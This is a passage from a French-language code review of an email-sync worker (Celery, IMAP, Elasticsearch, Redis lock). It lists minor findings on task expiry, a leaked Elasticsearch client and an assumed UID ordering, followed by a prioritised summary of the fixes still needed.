un écart qui mériterait d'être expliqué (il peut aussi provenir de documents orphelins de dossiers
supprimés).

**Correctif attendu** : n'avancer `sync_state[folder]` que si le lot a été intégralement traité, ou
positionner le curseur sur le dernier UID **effectivement indexé** plutôt que sur `batch_uids[-1]`.

---

## WK-07 — MINEUR : `"options": {"expires": 240}` est correct mais quasi inerte

**Certitude : CERTAIN**

**Fichier** : `src/worker/app.py:25`

Le mécanisme est le bon : les `options` du `beat_schedule` sont transmises à `apply_async`, et
`expires` y est un argument valide. La valeur est cohérente — 240 s < 300 s de période, donc un
message non consommé est écarté avant que le suivant ne soit produit, ce qui empêche
l'accumulation.

Réserve sur son utilité réelle : `expires` ne joue que si le message **n'est pas consommé**. Avec
`--concurrency=2`, si une synchro occupe un slot pendant 25 minutes, l'autre slot reste libre et
consomme immédiatement chaque message de beat ; celui-ci se heurte alors au verrou Redis, journalise
« already running » et rend la main en quelques millisecondes (`tasks.py:64-66`). Le message n'expire
donc jamais.

`expires` ne devient utile que dans le cas où les deux slots sont occupés simultanément. C'est une
ceinture par-dessus les bretelles : sans danger, mais ce n'est pas ce qui empêche l'empilement — le
verrou Redis s'en charge. À conserver, sans lui prêter d'effet qu'il n'a pas.

---

## WK-08 — MINEUR : le client Elasticsearch fuit quand un compte échoue

**Certitude : CERTAIN**

**Fichier** : `src/worker/tasks.py:113` et `:262`

`es = await get_es_client()` est ouvert ligne 113 ; `await es.close()` n'est appelé qu'à la
ligne 262, **hors de tout `finally`**. Le `try/finally` des lignes 167-256 ne couvre que la
connexion IMAP.

Toute exception levée entre les deux — par exemple `imap.connect()` ligne 165, `imap.list_folders()`
ligne 168, ou le `db.commit()` de la ligne 261 — remonte au gestionnaire de `_sync_all_accounts`
(ligne 85) sans jamais fermer le client. Sur un serveur IMAP indisponible, c'est une session HTTP
fuitée **par compte et par cycle**, soit 288 par jour et par compte.

**Correctif attendu** : envelopper le corps de `_sync_account` dans un `try/finally` fermant `es`.

---

## WK-09 — MINEUR : l'ordre croissant des UID est supposé, pas garanti

**Certitude : CERTAIN** sur la supposition ; impact **À CONFIRMER** (dépend du serveur)

**Fichier** : `src/worker/tasks.py:184` et `:241`

```python
uids_to_process = uids[:MAX_PER_FOLDER]     # « Process oldest first » (commentaire ligne 183)
...
sync_state[folder] = batch_uids[-1]
```

Les deux lignes supposent que `get_uids` renvoie les UID triés par ordre croissant. Or
`manager.py:106-112` retourne directement le résultat d'`UID SEARCH`, dont la RFC 3501 ne garantit
pas l'ordre. En pratique la quasi-totalité des serveurs répondent en ordre croissant, mais si l'un
d'eux ne le faisait pas, `batch_uids[-1]` ne serait pas le maximum du lot et **tous les UID
supérieurs déjà traités seraient définitivement sautés** (même mécanisme irréversible que WK-06).

**Correctif attendu** : `uids = sorted(uids, key=int)` dans `get_uids`, une ligne sans coût
mesurable qui rend explicites deux hypothèses aujourd'hui implicites.

---

## Synthèse Mission B — ces correctifs suffisent-ils ?

**Non.** Ils traitent le symptôme immédiat (un worker figé indéfiniment) mais introduisent un mode
de défaillance de remplacement, et laissent la cause racine partiellement ouverte.

**Ce qui fonctionne**, et qu'il faut garder :
- le principe des limites de temps — sans elles le pool restait bloqué à jamais ;
- le verrou Redis contre le recouvrement de `sync_all_accounts` avec lui-même ;
- `expires: 240`, correct dans son mécanisme ;
- la mécanique d'`AI_RULE_TIMEOUT` : bon idiome, bon ordre d'interception, bon import.

**Ce qui manque, par ordre de priorité** :

1. **Persister `sync_state` par lot** (WK-01). Sans cela, toute limite de temps détruit l'avancement,
   et le remède devient une boucle d'échec silencieuse. C'est le préalable à tout le reste.
2. **Relayer `SoftTimeLimitExceeded`** (WK-02). Sans cela la limite douce n'existe pas, et seul le
   kill brutal s'applique — ce qui rend le point 1 systématiquement nécessaire.
3. **Un disjoncteur sur les appels IA** (WK-03). Le délai par appel ne borne pas le coût total ;
   c'est le disjoncteur qui empêche réellement la répétition du blocage d'origine.
4. **Un verrou par compte, partagé par les deux tâches de synchro** (WK-04).
5. **Découper `sync_all_accounts` en une tâche par compte**, pour que le budget de temps soit par
   compte et qu'un compte lent n'empêche pas les autres de progresser (WK-01bis).
6. **Mesurer la durée réelle d'une synchro complète** avant de figer 1500 / 1800 s. Toute valeur
   retenue sans cette mesure reste une hypothèse.

**Enfin, un angle mort** : rien dans ces correctifs ne rend le blocage *observable*. Le worker
apparaît `offline` ou `online` dans `/admin/status`, sans indication de progression ni d'échec
répété. Un compteur de cycles consécutifs terminés par timeout, exposé dans ce tableau, permettrait
de détecter en minutes ce qui est resté invisible trois mois.

---

## Fichiers analysés

- `/var/www/mailia/src/web/static/index.html`
- `/var/www/mailia/src/worker/app.py`
- `/var/www/mailia/src/worker/tasks.py`
- `/var/www/mailia/src/rules/engine.py`
- Références croisées : `src/api/routes/accounts.py`, `src/api/routes/rules.py`,
  `src/api/routes/auth.py`, `src/api/routes/search.py`, `src/search/indexer.py`,
  `src/imap/manager.py`, `src/rules/parser.py`, `docker/Dockerfile.worker`, `docker-compose.yml`

Aucun fichier n'a été modifié.
